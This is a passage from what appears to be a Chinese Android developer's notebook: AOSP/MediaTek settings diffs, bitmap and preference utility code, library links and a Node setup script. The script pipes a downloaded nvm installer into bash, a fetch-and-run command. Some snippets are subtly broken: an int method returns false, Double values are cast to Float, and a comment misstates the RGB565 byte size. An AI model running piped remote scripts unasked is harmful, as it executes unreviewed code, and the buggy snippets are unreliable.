+                       final TimerObj mTimer_up = getCurrentTimer();
+                       /// R: add Prompt
+                       if (mTimer_up.mTimeLeft <= 0 ) {
+                               updateTimerState(mTimer_up, Timers.TIMES_UP);
+            }  
+                       
             for (int i = 0; i < mAdapter.getCount(); i++) {
                 final TimerObj t = mAdapter.getTimerAt(i);


四、铃声音量调节时；调节到最小后；再调大；还是没有声音

diff --git a/packages/apps/Settings/src/com/mediatek/audioprofile/SeekBarVolumizer.java b/packages/apps/Settings/src/com/mediatek/audioprofile/SeekBarVolumizer.java
old mode 100644
new mode 100755
index 3b52c18..fa24e40
--- a/packages/apps/Settings/src/com/mediatek/audioprofile/SeekBarVolumizer.java
+++ b/packages/apps/Settings/src/com/mediatek/audioprofile/SeekBarVolumizer.java
@@ -58,6 +58,7 @@ public class SeekBarVolumizer implements OnSeekBarChangeListener, Handler.Callba
     private final Receiver mReceiver = new Receiver();
     private final Observer mVolumeObserver;
     private String mKey;
+    private String mCurrentKey;//add by steven on 20170215
     private boolean mProfileIsActive = false;
 
     private int mOriginalStreamVolume;
@@ -81,6 +82,8 @@ public class SeekBarVolumizer implements OnSeekBarChangeListener, Handler.Callba
 
         mStreamType = streamType;
         mKey = profileKey;
+        // add by steven on 20170215
+        mCurrentKey = mProfileManager.getActiveProfileKey();
         //mMaxStreamVolume = mAudioManager.getStreamMaxVolume(mStreamType);
         mMaxStreamVolume = mProfileManager.getStreamMaxVolume(mStreamType);
         mSystemVolume = mAudioManager.getStreamVolume(mStreamType);
@@ -412,6 +415,9 @@ public class SeekBarVolumizer implements OnSeekBarChangeListener, Handler.Callba
         }
     }
 
+    // add by steven on 20170215
+    private static final String GENERAL_PREF_KEY = "mtk_audioprofile_general";
+    
     /**
      * When click the "Ok" button, set the volume to system.
      */
@@ -429,6 +435,11 @@ public class SeekBarVolumizer implements OnSeekBarChangeListener, Handler.Callba
                     + mLastProgress);
             setVolume(mStreamType, mLastProgress, false);
         } else {
+               // add by steven on 20170215
+               if (GENERAL_PREF_KEY.equals(mCurrentKey)&&!mProfileManager.isActiveProfile(mCurrentKey)) {
+                       mProfileManager.setActiveProfile(mCurrentKey);
+               }
+               
             if (!isSilentProfileActive()) {
                 Log.d("@M_" + TAG, "saveVolume: " + mStreamType
                         + " not Active, Revert system Volume "

三、修改蓝牙默认名称：
蓝牙名称未按要求设定；现在为Android BT；  Setting---->Bluetooth---->这里的字：“ANDROID BT ” 修改为：HaHa
diff --git a/system/bt/btif/src/btif_dm.c b/system/bt/btif/src/btif_dm.c
old mode 100644
new mode 100755
index f7b9ed4..2da5800
--- a/system/bt/btif/src/btif_dm.c
+++ b/system/bt/btif/src/btif_dm.c
@@ -195,7 +195,7 @@ static BOOLEAN btif_dm_inquiry_in_progress = FALSE;
 /************************************************************************************
 **  Static variables
 ************************************************************************************/
-static char btif_default_local_name[DEFAULT_LOCAL_NAME_MAX+1]  = {'\0'};
+static char btif_default_local_name[DEFAULT_LOCAL_NAME_MAX+1]  = "HaHa";
 
 /******************************************************************************

二、修改默认打开wifi、bluetooth
diff --git a/frameworks/base/packages/SettingsProvider/res/values/defaults.xml b/frameworks/base/packages/SettingsProvider/res/values/defaults.xml
old mode 100644
new mode 100755
index daa22c4..0a7584b
--- a/frameworks/base/packages/SettingsProvider/res/values/defaults.xml
+++ b/frameworks/base/packages/SettingsProvider/res/values/defaults.xml
@@ -36,7 +36,7 @@
     <bool name="def_haptic_feedback">true</bool>
 
     <bool name="def_bluetooth_on">false</bool>    // 默认打开蓝牙 true  false
-    <bool name="def_wifi_display_on">false</bool>
+    <bool name="def_wifi_display_on">true</bool>
     <bool name="def_install_non_market_apps">false</bool>
     <bool name="def_package_verifier_enable">true</bool>

     <bool name="assisted_gps_enabled">true</bool>
     <bool name="def_netstats_enabled">true</bool>
     <bool name="def_usb_mass_storage_enabled">true</bool>
-    <bool name="def_wifi_on">false</bool>
+    <bool name="def_wifi_on">true</bool>
     <!-- 0 == never, 1 == only when plugged in, 2 == always -->
     <integer name="def_wifi_sleep_policy">2</integer>
     <bool name="def_networks_available_notification_on">true</bool>
```

## [prop] Android 系统属性SystemProperty分析

```text
https://blog.csdn.net/yangwen123/article/details/8936555
```

## Android中@Override错误的解决方法

```text
在使用eclipse开发Android应用时可能会遇到@Override错误，对于@Override的annotation报错。这是由于JRE/JDK的版本问题所致。解决方法很简单，在eclipse的Windows菜单-Preference-Java-Complier中调整Complier compliance level即可。虽然Android是基于1.5设计的，不过由于eclipse的兼容问题，需要在这里修改为1.6才行。

对于已经导入至workspace的项目，可能还需要点击右上角的Configure Project Specifiec Settings对其进行修改才行。
完成了修改之后，之前编译器提示的@Override错误就会消失了。
```

## [Snippet] Android中获取设备当前时间日期

```text
Calendar c = Calendar.getInstance();
String month = Integer.toString(c.get(Calendar.MONTH));
String day = Integer.toString(c.get(Calendar.DAY_OF_MONTH));
String hour = Integer.toString(c.get(Calendar.HOUR_OF_DAY));
String min = Integer.toString(c.get(Calendar.MINUTE));
```

## [开源] 帮我生成java类的库GeneratorX

```text
https://blog.csdn.net/weizongwei5/article/details/54312281
```

## [开源] 使用Facebook redex工具优化app

```text
https://blog.csdn.net/weizongwei5/article/details/52146166

在Facebook工程博客的一篇文章中指出，`dex`并不是按照应用启动时候加载的顺序加载的，而是按照编译工具指定的顺序加载的。

ReDex使程序运行时产生的运行数据判定哪些类应该在.DEX文件中被优先载入。“想要最小化从内存中读取数据的次数，最好从启动的时候就载入字节码。”Facebook称，他们使用ReDex对应用优化之后，对存储的读取减少了25%，运行速度提高了30%。
关于这个速度，Facebook称，在存储较慢的老旧机器上效果非常明显，但是对于新的收集，性能也有明显的提高。

Facebook在一台搭载了安卓4.4的全新的Nexus4上（有35%的安卓设备运行这个版本）测试，启动时间从2秒降至1.6秒。

Runtime分析可以用来删除无关的元数据和接口，但是开发者也可以自定义优化的行为。比如，有些方法即使没有直接被调用，也可以让它们保留下来。

这个优化是在应用编译完成之后进行的。也就是说，理论上你也可以结合其他优化，比如对Java进行虚拟机层的优化和语言的优化，像即将到来的Java 9的语言模块特性等等。
优化Java的字节码文件并不是一种新技术。还有其他的开源项目，例如ProGuard就可以通过删除运行时没有使用的代码进行优化。但是它并不能像ReDex那样按照执行顺序来重新组织类。
```

## 某个类使用private修饰了带参构造函数,如果你特么的还非要访问这个带参构造函数的话

```text
用Gson里面这个UnsafeAllocator 可以完美实现不开放默认构造函数的类的实例化。这个方案同时可以解决4的问题。
```

## 5.0之前的android系统是webkit内核，5.0之后便是chromium内核，虽然webiew内核改了，或许性能提升了很多，但是终究他还是单线程在操作，你懂得

## [Snippet] 保持宽高比的自定义View

```text
<declare-styleable name="FixHeiImageView">
    <attr name="whratio" format="float" />
</declare-styleable> 

public class FixHeiImageView extends ImageView {
    private double wh_ratio=0.0;
    public FixHeiImageView(Context context) {
        super(context);
        wh_ratio = 2.0;
    }

    public FixHeiImageView(Context context, double mWh_ratio) {
        super(context);
        this.wh_ratio = mWh_ratio;
    }

    public FixHeiImageView(Context context, AttributeSet attrs) {
        super(context, attrs);
        TypedArray typedArray = context.obtainStyledAttributes(attrs, R.styleable.FixHeiImageView);
        wh_ratio = typedArray.getFloat(R.styleable.FixHeiImageView_whratio, (float) 1.0);
        typedArray.recycle();
    }

    public FixHeiImageView(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);
        TypedArray typedArray = context.obtainStyledAttributes(attrs, R.styleable.FixHeiImageView);
        wh_ratio = typedArray.getFloat(R.styleable.FixHeiImageView_whratio, (float) 1.0);
        typedArray.recycle();
    }

    @Override
    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
        // 父容器传过来的宽度方向上的模式
        int widthMode = MeasureSpec.getMode(widthMeasureSpec);
        // 父容器传过来的高度方向上的模式
        int heightMode = MeasureSpec.getMode(heightMeasureSpec);
        // 父容器传过来的宽度的值
        int width = MeasureSpec.getSize(widthMeasureSpec) - getPaddingLeft() - getPaddingRight();
        // 父容器传过来的高度的值
        int height = MeasureSpec.getSize(heightMeasureSpec) - getPaddingBottom() - getPaddingTop();
        height = (int) (width / wh_ratio + 0.5f);
        heightMeasureSpec = MeasureSpec.makeMeasureSpec(height, MeasureSpec.EXACTLY);
        super.onMeasure(widthMeasureSpec, heightMeasureSpec);
    }
}
```

## [Snippet] android 以省内存方式把图片加载到内存

```text
package com.commons.utils.image;
 
import android.annotation.TargetApi;
import android.content.Context;
import android.graphics.*;
import android.os.Build;
import android.util.Log;
import com.commons.config.GlobalConfig;
import com.commons.utils.memory.MemoryUtils;
 
import java.io.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
 
/**
 * 从DrawableUtil类中分离出来这个类,为了使代码看起来更加简洁明了
 * 用于Bitmap处理的一些方法
 */
public class BitmapUtils {
    public static final int ARGB8888_MODEL=4;//ARGB8888模式下消耗内存,为像素数乘以4个字节.
    public static final int RGB565_MODEL=2;//RGB565模式下消耗内存,为像素数乘以4个字节.
    /**
     * 获取APP剩余可申请内存,判断是否够大,以手机分辨率为基础,进行计算图片处理所需要消耗的内存.
     * @return
     *
     * !!!这里获取的不是手机的剩余内存而是APP的
     */
    public static boolean isBigSurpluseMemory(Context context) {
        boolean isbig=true;//默认
        long appsurplusMe= MemoryUtils.getAppSurplusMe();//这里单位是Byte
        long phonesurplusMe= MemoryUtils.getPhoneSurplusMe(context);//这里单位是Byte
        long bitmapoptNeedmemory=GlobalConfig.scrwid*GlobalConfig.scrhei*ARGB8888_MODEL;//单位依旧是Byte
        //在进行图片处理的时候会把图片分辨率缩小到屏幕分辨率大小,所以这里消耗内存的计算是以屏幕分辨率所谓基础的.
        if(bitmapoptNeedmemory*2 > appsurplusMe)//为了其他考虑,剩余内存应该大于所需要内存的两倍
        {
            return false;
        }
 
 
        if(bitmapoptNeedmemory*2>phonesurplusMe)
        {
            return  false;
        }//这里一定要判断手机剩余内存,上面的判断只是app的理论上的内存限制,而如果手机本身就已经没有内存了,
        // 会有两种情况 1.自动清理一些内存  来给当前app用,2.本身就是内存太小,现在占内存的应用都是系统级别的清理不掉,那就坑了
        // 举个例子：125M内存的手机上就会发生当手机时，我发现内存不够的时候，android的自动杀进程的机制就没法用了
        //请看如下的我在410M的手机上运行的结果
 
        return isbig;
    }
    /**
     12-11 16:52:35.260      441-441/com.jsdx.zqysypt D/MemoryUtils.printMemoryInfo()﹕ 常规应用最大内存限制:64M 流氓应用最大内存限制:128M
     12-11 16:52:35.270      441-441/com.jsdx.zqysypt D/MemoryUtils.printMemoryInfo()﹕ APP当前内存状态: 最大可申请内存:128MB 已申请内存:21MB 空闲内存:4MB
     12-11 16:52:35.270      441-441/com.jsdx.zqysypt D/MemoryUtils.printMemoryInfo()﹕ 手机剩余内存:70.12109MB 手机总内存:410.54297MB
     这里可以明显看出app剩余可申请的内存要大于手机的剩余内存的.当申请更多内存的时候android就会自动清理
     */

    /**
     * 创建倒影图片
     * @throws IOException
     */
    public static Bitmap createReflectedBitmap(Bitmap srcBitmap) {
        if (null == srcBitmap) {
            return null;
        }
 
        // The gap between the reflection bitmap and original bitmap.
        final int REFLECTION_GAP = 4;
 
        int srcWidth = srcBitmap.getWidth();
        int srcHeight = srcBitmap.getHeight();
        int reflectionWidth = srcBitmap.getWidth();
        int reflectionHeight = srcBitmap.getHeight() / 2;
 
        if (0 == srcWidth || srcHeight == 0) {
            return null;
        }
 
        // The matrix
        Matrix matrix = new Matrix();
        matrix.preScale(1, -1);
 
        try {
            // The reflection bitmap, width is same with original's, height is half of original's.
            Bitmap reflectionBitmap = Bitmap.createBitmap(
                    srcBitmap,
                    0,
                    srcHeight / 2,
                    srcWidth,
                    srcHeight / 2,
                    matrix,
                    false);
 
            if (null == reflectionBitmap) {
                return null;
            }
 
            // Create the bitmap which contains original and reflection bitmap.
            Bitmap bitmapWithReflection = Bitmap.createBitmap(
                    reflectionWidth,
                    srcHeight + reflectionHeight + REFLECTION_GAP,
                    Bitmap.Config.ARGB_8888);
 
            if (null == bitmapWithReflection) {
                return null;
            }
 
            // Prepare the canvas to draw stuff.
            Canvas canvas = new Canvas(bitmapWithReflection);
 
            // Draw the original bitmap.
            canvas.drawBitmap(srcBitmap, 0, 0, null);
 
            // Draw the reflection bitmap.
            canvas.drawBitmap(reflectionBitmap, 0, srcHeight + REFLECTION_GAP, null);
 
            Paint paint = new Paint();
            paint.setAntiAlias(true);
            LinearGradient shader = new LinearGradient(
                    0,
                    srcHeight,
                    0,
                    bitmapWithReflection.getHeight() + REFLECTION_GAP,
                    0x70FFFFFF,
                    0x00FFFFFF,
                    Shader.TileMode.MIRROR);
            paint.setShader(shader);
            paint.setXfermode(new PorterDuffXfermode(android.graphics.PorterDuff.Mode.DST_IN));
 
            // Draw the linear shader.
            canvas.drawRect(
                    0,
                    srcHeight,
                    srcWidth,
                    bitmapWithReflection.getHeight() + REFLECTION_GAP,
                    paint);
 
            return bitmapWithReflection;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static Bitmap revitionImageSize(String path, int max_w, int max_h) throws IOException {
        BufferedInputStream in = new BufferedInputStream(new FileInputStream(new File(path)));
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        BitmapFactory.decodeStream(in, null, options);
        in.close();
        int i = 0;
        Bitmap bitmap = null;
        while (true) {
            if ((options.outWidth >> i <= max_w) && (options.outHeight >> i <= max_h)) {
                in = new BufferedInputStream(new FileInputStream(new File(path)));
                options.inSampleSize = (int) Math.pow(2.0D, i);
                options.inJustDecodeBounds = false;
                bitmap = BitmapFactory.decodeStream(in, null, options);
                break;
            }
            i += 1;
        }
        return bitmap;
    }

    /**
     *将Bitmap保存到本地
     * @param bitmap
     * @param imgurl imgurl   不带file了开头的路径,如:  /strange/sdcard/asdasd.jpg
     */
    public static void savePictureToLocal(Bitmap bitmap, String imgurl) {
        FileOutputStream b = null;
        File file = new File(imgurl);
        file.getParentFile().mkdirs();// 创建文件夹
        //对图片质量进行压缩,这样保存的图片就变小了
        int yasuolv = 60;
        try {
            b = new FileOutputStream(imgurl);
            bitmap.compress(Bitmap.CompressFormat.JPEG, yasuolv, b);// 把数据写入文件
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } finally {
            try {
                b.flush();
                b.close();
                //bitmap.recycle();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 得到本地或者网络上的bitmap url - 网络或者本地图片的绝对路径,比如:
     * <p/>
     * A.网络路径: url="http://blog.foreverlove.us/girl2.png" ;
     * <p/>
     * B.本地路径:url="mnt/sdcard/photo/image.png";  不带 file: 头
     * <p/>
     * C.支持的图片格式 ,png, jpg,bmp,gif等等
     *
     * @param path
     * @return
     */
    @TargetApi(Build.VERSION_CODES.HONEYCOMB_MR1)
    public static Bitmap GetLocalOrNetBitmap(String path) {
        final String TAG = "GetLocalOrNetBitmap";
        Bitmap bitmap = null;
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            bitmap = BitmapFactory.decodeFile(path, options); //此时返回 bm 为空
            options.inJustDecodeBounds = false; //缩放比。由于是固定比例缩放，只用高或者宽其中一个数据进行计算即可
            int hi = (int) (options.outHeight / (float) GlobalConfig.scrhei);//以屏幕高度作为显示依据
            int wi = (int) (options.outWidth / (float) GlobalConfig.scrwid);//以屏幕高度作为显示依据
            int be = 0;
            if (wi > hi) {
                be = hi;
            } else {
                be = wi;
            }
            Log.d(TAG, "缩放比:"+be); //缩放之后
            Log.d(TAG, "原图宽高:"+options.outWidth+" "+options.outHeight); //缩放之后
 
            if (be <= 0) {
                be = 1;
            }
            options.inSampleSize = be; //重新读入图片，注意此时已经把 options.inJustDecodeBounds 设回 false 了
            options.inPreferredConfig = Bitmap.Config.RGB_565;//使用RGB_565后会是内存降低一半但是,不适合decode带有透明区域的PNG
            bitmap = BitmapFactory.decodeFile(path, options);
            int w = bitmap.getWidth();
            int h = bitmap.getHeight();
            Log.d(TAG, "缩放后:宽"+w + " 高" + h); //缩放之后
            Log.d(TAG, "RGB_565格式内存:"+bitmap.getByteCount() / 1024 + "KB");
        } catch (Exception ex) {
            if (bitmap!=null && !bitmap.isRecycled()) {
                bitmap.recycle();
            }
            System.gc();  //提醒系统及时回收
        }
        return bitmap;
    }

    //同上,最后一个参数可选,配置是否返回高色彩的Bitmap
    //本地路径  不带 file: 头
    @TargetApi(Build.VERSION_CODES.HONEYCOMB_MR1)
    public static Bitmap GetLocalOrNetBitmap(String path, boolean isRGb_565) {
        final String  TAG="GetLocalOrNetBitmap";
        Bitmap bitmap = null;
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            bitmap = BitmapFactory.decodeFile(path, options); //此时返回 bm 为空
            options.inJustDecodeBounds = false; //缩放比。由于是固定比例缩放，只用高或者宽其中一个数据进行计算即可
            int hi = (int) (options.outHeight / (float) GlobalConfig.scrhei);//以屏幕高度作为显示依据
            int wi = (int) (options.outWidth / (float) GlobalConfig.scrwid);//以屏幕高度作为显示依据
 
            int be = 0;
            if (wi > hi) {
                be = hi;
            } else {
                be = wi;
            }
            Log.d(TAG, "缩放比:"+be); //缩放之后
            Log.d(TAG, "原图宽高:"+options.outWidth+" "+options.outHeight); //缩放之后
 
            if (be <= 0) {
                be = 1;
            }
            options.inSampleSize = be; //重新读入图片，注意此时已经把 options.inJustDecodeBounds 设回 false 了
            if (isRGb_565) {
                options.inPreferredConfig = Bitmap.Config.RGB_565;//使用RGB_565后会是内存降低一半但是,不适合decode带有透明区域的PNG
            }
            bitmap = BitmapFactory.decodeFile(path, options);
            int w = bitmap.getWidth();
            int h = bitmap.getHeight();
            Log.d(TAG, "缩放后:宽" + w + " 高" + h); //缩放之后
            Log.d(TAG, "RGB_565格式内存:"+bitmap.getByteCount() / 1024 + "KB");
        } catch (Exception ex) {
            if(bitmap!=null&&!bitmap.isRecycled()) {
                bitmap.recycle();
            }
            System.gc();  //提醒系统及时回收
        }
        return bitmap;
    }

    //同上,最后一个参数可选,配置是否返回高色彩的Bitmap
    //本地路径  不带 file: 头
    @TargetApi(Build.VERSION_CODES.HONEYCOMB_MR1)
    public static Bitmap GetLocalOrNetBitmap(String path, boolean isRGb_565,int maxwidth,int maxheight) {
        final String  TAG="GetLocalOrNetBitmap";
        Bitmap bitmap = null;
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            Log.d("GetLocalOrNetBitmap",path);
 
            bitmap = BitmapFactory.decodeFile(path, options); //此时返回 bm 为空
            options.inJustDecodeBounds = false; //缩放比。由于是固定比例缩放，只用高或者宽其中一个数据进行计算即可
            int hi = (int) (options.outHeight / (float) maxwidth);//以指定宽度作为显示依据
            int wi = (int) (options.outWidth / (float) maxheight);//以指定高度作为显示依据
 
            int be = 0;
            if (wi < hi) {
                be = hi;
            } else {
                be = wi;
            }
 
            Log.d(TAG, "缩放比:"+be); //缩放之后
            Log.d(TAG, "原图宽高:"+options.outWidth+" "+options.outHeight); //缩放之后
 
            if (be <= 0) {
                be = 1;
            }
            options.inSampleSize = be; //重新读入图片，注意此时已经把 options.inJustDecodeBounds 设回 false 了
            if(isRGb_565) {
                options.inPreferredConfig = Bitmap.Config.RGB_565;//使用RGB_565后会是内存降低一半但是,不适合decode带有透明区域的PNG
            }
            bitmap = BitmapFactory.decodeFile(path, options);
            int w = bitmap.getWidth();
            int h = bitmap.getHeight();
            Log.d(TAG, "缩放后:宽" + w + " 高" + h); //缩放之后
            Log.d(TAG, "RGB_565格式内存:"+bitmap.getByteCount() / 1024 + "KB");
        } catch (Exception ex) {
            if(bitmap!=null&&!bitmap.isRecycled()) {
                bitmap.recycle();
            }
            System.gc();  //提醒系统及时回收
        }
        return bitmap;
    }
 
    public static void createPath(String path) {
        File file = new File(path);
        if (!file.exists()) {
            file.mkdir();
        }
    }
 
    //传递两个参数即可 第一个是bitmap  第二个是目录名称,第二个参数为空时  保存在SD卡上
    public static void saveMyBitmap(Bitmap bmp, String directory, String filename) {
        String direc = "";
        if (directory.length() < 1) {
            direc = GlobalConfig.sdPath + "/";
        } else {
            direc = GlobalConfig.sdPath + "/" + directory + "/";
            createPath(direc);
        }
        File f = null;
        if (filename.length() < 1) {
            try {
                Date date = new Date();
                DateFormat format = new SimpleDateFormat("yyyy-MM-dd HH_mm_ss_");
                filename = "www.njoki.com__" + format.format(date);
            } catch (Exception e) {
                filename = "未知";
            }
            f = new File(direc + filename + ".png");
        } else {
            f = new File(direc + filename + ".png");
        }
 
        FileOutputStream fOut = null;
        try {
            f.createNewFile();
            fOut = new FileOutputStream(f);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        //Bitmap bitmap = ((BitmapDrawable)mImageView.getDrawable()).getBitmap();
        //bitmap.compress(Bitmap.CompressFormat.PNG, 100, fOut);
        bmp.compress(Bitmap.CompressFormat.PNG, 100, fOut);
        try {
            fOut.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            fOut.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

## [Snippet] 给自己公司的项目写了两个功能 1.将对象写入本地缓存 2.去本地的缓存放到对象中

```text
//讲一个对象存储到本地缓存里面
public static void setObjectToSharedpreferences(Object oc,String name) {
    if (oc == null) {
        return;
    }
    if (oc instanceof Integer || oc instanceof String || oc instanceof Double || oc instanceof Float || oc instanceof Boolean) {
        return;
    }
    Field[]  fields = oc.getClass().getDeclaredFields();
    SharedPreferences settings = LYApplication.getInstance().getSharedPreferences(name, 0);
    SharedPreferences.Editor editor = settings.edit();

    for (Field f : fields) {
        f.setAccessible(true);
    }
    if (fields.length == 0) {
        return;
    }
    //输出所有属性
    for (int i = 0; i < fields.length; i++) {
        String field = fields[i] .toString().substring(fields[i] .toString().lastIndexOf(".") + 1);         //取出属性名称
        try {
            if (fields[i] .get(oc) instanceof String) {
                editor.putString(field, ((String) fields[i] .get(oc)));
            } else if (fields[i] .get(oc) instanceof Integer) {
                editor.putInt(field, ((Integer) fields[i] .get(oc)));
            } else if (fields[i] .get(oc) instanceof Double) {
                editor.putFloat(field, ((Float) fields[i] .get(oc)));
            } else if (fields[i] .get(oc) instanceof Float) {
                editor.putFloat(field, ((Float) fields[i] .get(oc)));
            } else if (fields[i] .get(oc) instanceof Boolean) {
                editor.putBoolean(field, ((Boolean) fields[i] .get(oc)));
            } else if (fields[i] .get(oc) instanceof Long) {
                editor.putLong(field, ((Long) fields[i] .get(oc)));
            }
        } catch (IllegalArgumentException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }
    editor.commit();
}

//取本地缓存  写入到一个对象中
public static void getObjectToSharedpreferences(Object oc,String name) {
    if (oc == null)
        return ;
    if (oc instanceof Integer || oc instanceof String || oc instanceof Double || oc instanceof Float || oc instanceof Boolean)
        return ;

    Field[]  fields = oc.getClass().getDeclaredFields();
    SharedPreferences settings = LYApplication.getInstance().getSharedPreferences(name, 0);


    for (Field f : fields) {
        f.setAccessible(true);
    }
    if (fields.length == 0)
        return ;
    //输出所有属性
    for (int i = 0; i < fields.length; i++) {

        String field = fields[i] .toString().substring(fields[i] .toString().lastIndexOf(".") + 1);         //取出属性名称
        try {

            if (fields[i] .get(oc) instanceof String) {
                String s = settings.getString(field, ((String) fields[i] .get(oc)));
                fields[i] .set(oc, s);
            } else if (fields[i] .get(oc) instanceof Integer) {
                int s = settings.getInt(field, ((Integer) fields[i] .get(oc)));
                fields[i] .set(oc, s);
            } else if (fields[i] .get(oc) instanceof Double) {
                float s = settings.getFloat(field, ((Float) fields[i] .get(oc)));
                fields[i] .set(oc, s);
            } else if (fields[i] .get(oc) instanceof Float) {
                float s = settings.getFloat(field, ((Float) fields[i] .get(oc)));
                fields[i] .set(oc, s);
            } else if (fields[i] .get(oc) instanceof Boolean) {
                boolean s = settings.getBoolean(field, ((Boolean) fields[i] .get(oc)));
                fields[i] .set(oc, s);
            } else if (fields[i] .get(oc) instanceof Long) {
                long s = settings.getLong(field, ((Long) fields[i] .get(oc)));
                fields[i] .set(oc, s);
            }

        } catch (IllegalArgumentException e) {
            return ;
        } catch (IllegalAccessException e) {
            return ;
        }
    }

}
```

## [Snippet] 使用.properties文件读写属性值

```text
https://blog.csdn.net/aqi00/article/details/50846832

Java中的配置文件常为.properties文件，而Properties类便是读写此类文件的工具。属性文件有两种格式，一种是文本格式，其内容是“键=值”的形式，文本注释信息可以用"#"来注释。另一种是XML格式，键值对遵循XML规范，Android的SharedPreferences也是以xml存储的。

下面是Properties的常用方法：
load : 从属性文件中加载属性对象
store : 把属性对象保存到属性文件
getProperty : 获取属性值
setProperty : 设置属性值
loadFromXML : 从XML格式的属性文件中加载属性对象
storeToXML : 把属性对象保存到XML格式的属性文件

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Properties;
 
import android.content.Context;
import android.os.Environment;
import android.util.Log;
 
public class PropertiesUtil {
 private final static String TAG = "PropertiesUtil";
 
 private Context mContext;
 private String mPath;
 private String mFile;
 private Properties mProp;
 private static PropertiesUtil mPropUtil = null;
 
 public static PropertiesUtil getInstance(Context context) {
  if (mPropUtil == null) {
   mPropUtil = new PropertiesUtil();
   mPropUtil.mContext = context;
   mPropUtil.mPath = Environment.getExternalStorageDirectory() + "/ExmKeyValue";
   mPropUtil.mFile = "properties.ini";
  }
  return mPropUtil;
 }
 
 public PropertiesUtil setPath(String path) {
  mPath = path;
  return this;
 }
 
 public PropertiesUtil setFile(String file) {
  mFile = file;
  return this;
 }
 
 public PropertiesUtil init() {
  Log.d(TAG, "path="+mPath+"/"+mFile);
  try {
   File dir = new File(mPath);
   if (!dir.exists()) {
    dir.mkdirs();
   }
   File file = new File(dir, mFile);
   if (!file.exists()) {
    file.createNewFile();
   }
   InputStream is = new FileInputStream(file);
   mProp = new Properties();
   mProp.load(is);
   is.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
  return this;
 }
 
 public void commit() {
  try {
   File file = new File(mPath + "/" + mFile);
   OutputStream os = new FileOutputStream(file);
   mProp.store(os, "");
   os.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
  mProp.clear();
 }
 
 public void clear() {
  mProp.clear();
 }
 
 public void open() {
  mProp.clear();
  try {
   File file = new File(mPath + "/" + mFile);
   InputStream is = new FileInputStream(file);
   mProp = new Properties();
   mProp.load(is);
   is.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
 
    public void writeString(String name, String value) {
     mProp.setProperty(name, value);
    }
 
    public String readString(String name, String defaultValue) {
        return mProp.getProperty(name, defaultValue);
    }
 
    public void writeInt(String name, int value) {
     mProp.setProperty(name, ""+value);
    }
 
    public int readInt(String name, int defaultValue) {
        return Integer.parseInt(mProp.getProperty(name, ""+defaultValue));
    }
 
    public void writeBoolean(String name, boolean value) {
     mProp.setProperty(name, ""+value);
    }
 
    public boolean readBoolean(String name, boolean defaultValue) {
        return Boolean.parseBoolean(mProp.getProperty(name, ""+defaultValue));
    }
 
    public void writeDouble(String name, double value) {
     mProp.setProperty(name, ""+value);
    }
 
    public double readDouble(String name, double defaultValue) {
        return Double.parseDouble(mProp.getProperty(name, ""+defaultValue));
    }
}

// 写 .properties 文件
PropertiesUtil mProp = PropertiesUtil.getInstance(this).init();
mProp.writeString("name", "Mr Lee");
mProp.writeInt("age", (int)(Math.random()*100%100));
mProp.writeBoolean("married", true);
mProp.writeDouble("weight", 100f);
mProp.writeString("time", Utils.getNowDateTime());
mProp.commit();

// 读 .properties 文件
PropertiesUtil mProp = PropertiesUtil.getInstance(this).init();
mProp.open();
String name = mProp.readString("name", "");
int age = mProp.readInt("age", 0);
boolean married = mProp.readBoolean("married", false);
double weight = mProp.readDouble("weight", 0f);
String time = mProp.readString("time", "");
```

## 树莓派

```text
科学上网，你需要的是 openwrt 路由
如果需要架设网站，你需要的是vps；
一个私有git服务器，相信我数据丢失的风险相当大，出门左拐有bitbucket；
BT下载和NAS，你需要的是一个真正的NAS；
airplay，小米电视都有，安卓机顶盒都有，方式多到简直不要不要的；
私有云NAS也会有；上传到百度盘的功能nas也有；
网站资源下载是什么，如果是爬站那普通人用不到，如果只是想看新闻，大多数都有rss，你需要的是feedly；dnsmasq在openwrt，这都不是事儿；
远程开机关机——openwrt装个pptpd，你就在家里；
定时的语音任务——找个旧手机设定闹铃就好了，好多闹铃app支持自己录音的。
```

## 配置 node.js 的脚本

```text
curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.26.1/install.sh | bash
source ~/.nvm/nvm.sh
export NVM_IOJS_ORG_MIRROR="http://npm.taobao.org/mirrors/iojs"
nvm i 4
nvm alias default v4.0.0
npm install -g cnpm --registry=https://registry.npm.taobao.org
cnpm install pm2 -g
```

## [开源]  [log] 简洁好看实用的logger库

```text
https://github.com/orhanobut/logger

implementation 'com.orhanobut:logger:2.2.0'
```

## [开源] 媲美微信的二维码识别库

```text
https://mp.weixin.qq.com/s/f8rmlWR1ZHtAv-TvTGFy7Q

1，YUV
2，图像缩小
3，裁剪
4，使用OpenCV加快识别
```

## [Snippet]  [算法] 寻找一个数组中是否有重复的数字

```text
public int duplicate(int arr[] , int length) {
    int i = 0;
    while(i < length){
        if(arr[arr[i] ]  == arr[i] ){
            if(arr[i]  == i){
                i++;
            }else{
                return arr[i] ;
            }
        }else{
            int tmp = arr[arr[i] ] ;
            arr[arr[i] ]  = arr[i] ;
            arr[i]  =  tmp;
        }
    }
    return false;
}
```

## JSON解析的三种方式

```text
第一. 传统的JSON解析  可以把json字符串解析为一个javabean，一个List数组，一个嵌套Map的List数组
